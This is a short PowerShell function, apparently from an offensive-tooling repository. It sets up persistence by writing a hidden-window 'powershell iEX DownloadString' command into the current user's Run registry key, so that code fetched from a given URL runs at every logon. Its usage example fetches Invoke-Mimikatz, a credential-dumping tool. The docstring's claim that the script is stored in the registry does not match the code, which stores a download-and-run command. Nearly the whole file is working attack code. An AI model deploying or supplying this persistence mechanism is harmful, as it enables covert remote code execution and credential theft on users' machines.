
function Test-Persistence-Execute-Script-Web
{
<#
.SYNOPSIS
Custom script which can download file content from a URL and stores it as a PowerShell script in registry keys.

.DESCRIPTION
This payload downloads file content from a URL and stores it as a PowerShell script in registry keys.

.PARAMETER URL
The URL parameter defines the file to be downloaded.

.PARAMETER RKEY_NAME
The RKEY_NAME defines the Registry key name.

.EXAMPLE
PS > Test-Persistence-Execute-Script-Web "https://mysite.co/Invoke-Mimikatz.ps1"

.LINK
https://github.com/FabianConP/ObfuscationCode
#>    
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RKEY_NAME
    )
    
    #Make a payload from PayloadURL
    $Payload = "powershell -win hid -noP iEX ((New-Object Net.WebClient).DownloadString('$URL'));"

    $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

    # Check if it already exists a key with the given name
    if($runKeys.$RKEY_NAME){
        # Remove it if already exists
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME
    }
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME -Value $Payload

}